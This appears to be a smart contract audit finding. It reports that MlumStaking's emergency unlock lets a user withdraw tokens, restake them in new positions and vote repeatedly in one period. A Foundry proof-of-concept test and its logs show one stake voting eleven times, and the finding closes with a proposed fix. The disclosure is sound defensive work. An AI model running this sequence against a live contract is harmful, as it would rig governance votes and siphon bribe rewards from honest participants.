# users can vote multiple times with same stake tokens when emergancyUnlock is set

## Summary

in `MlumStaking` users can stake for a certain period and get rewards and voting power, the owner can set `_emergencyUnlock` which allows users to unlock without waiting for the lockDuration, this allows voters to vote multiple times with the same stake.

## Vulnerability Detail

users can stake their funds by calling `createPosition` where they lock their funds for a certain duration the longer the duration the bigger the lockMultiplier. 

the lockedAmount gives them a share of rewards and voting power. this staked position is represented as a nft that is not transferable.

to vote users need to have a position (nft) that is locked for a certain duration:

- Voter
```solidity
if (_mlumStaking.getStakingPosition(tokenId).initialLockDuration < _minimumLockTime) {
    revert IVoter__InsufficientLockTime();
}
if (_mlumStaking.getStakingPosition(tokenId).lockDuration < _periodDuration) {
    revert IVoter__InsufficientLockTime();
}
```

so their initial lock duration needs to be more than the minimumLockTime and their lockDuration needs to be more than _periodDuration. this is to not allow voter to stake tokens vote with them , then transfer them to another position and vote.

but if `_emergancyUnlock` is set a user can withdraw without waiting the lock duration:

- MlumStaking
```solidity
require(
            _unlockOperators.contains(nftOwner)
                || (position.startLockTime + position.lockDuration) <= _currentBlockTimestamp() || isUnlocked(),
            "locked"
        );
```

which makes it possible for an attacker to vote with one position , then transfer staked tokens to another position and vote with that basically voting twice with the same tokens.

this can be repeated as many times as the attacker wants.

## Proof Of Concept

in this POC , the attacker was able to vote multiple times with the same staking tokens in the same voting period using the emergancyUnlock.

important to note that the attacker doesn't need to frontrun nor predict the emergancy unlock , he can just participate in the staking normally , until the emergancy unlock is set then he can exploit.

function testVotingMultipleEmergancy() public {
        address attacker = address(0x1337);

        //pool to vote for
        address[] memory pools = new address[](1);
        pools[0] = 0x95f00a7125EC3D78d6B2FCD6FFd9989941eF25fC;

        //amount 
        uint[] memory deltaAmounts = new uint256[](1);
        deltaAmounts[0] = 1.5 ether;

        //attacker creates position and funds it with most staking tokens
        {
            
        _stakingToken.mint(attacker, 2 ether);

        vm.startPrank(attacker);
        _stakingToken.approve(address(_pool), 1000 ether);
        _pool.createPosition(1.5 ether, 4 weeks);
        vm.stopPrank();

        }

        //attacker creates multiple positions with 1 wei
        {

        vm.startPrank(attacker);

        //the attacker can create as many positions as he wants
        for(uint i; i < 10; i++){
            _pool.createPosition(1, 4 weeks);
        }
        vm.stopPrank();

        }

        //owner starts a new voting period
        vm.prank(DEV);
        _voter.startNewVotingPeriod();

        //attacker votes with first position
        {
        vm.startPrank(attacker);
        _voter.vote(1, pools, deltaAmounts);
        console.log("Votes before transfering voting power and voting multiple times: ",_voter.getVotesPerPeriod(1, pools[0]));
        vm.stopPrank();
        }

        //owner starts emergancyUnlock , doesn't matter if attacker voted before or after
        {
        vm.prank(DEV);
        _pool.setEmergencyUnlock(true);
        }

        //attacker withdraws from first position and transfers to the next
        {
        vm.startPrank(attacker);
        _pool.withdrawFromPosition(1, 1.5 ether);

        for(uint i; i < 10; i++){
            _pool.addToPosition(i+2, 1.5 ether);
            _voter.vote(i+2, pools, deltaAmounts);
            _pool.withdrawFromPosition(i+2, 1.5 ether);
        }

        //check that the pool we voted for has all the votes
        console.log("votes after doing the exploit: ", _voter.getVotesPerPeriod(1, pools[0]));
        vm.stopPrank();
        }
    }
```
- logs
```solidity
Votes before transfering voting power and voting multiple times:  1500000000000000000
votes after doing the exploit:  16500000000000000000
```

## Impact

The `emergencyUnlock` feature allows attackers to vote multiple times with the same staked tokens. This enables them to disproportionately influence the voting weight of any pool and gain excessive bribe rewards.

## Recommendation

To mitigate this issue, either block voting when `emergencyUnlock` is active or prevent users from adding to their positions during the `emergencyUnlock` period.
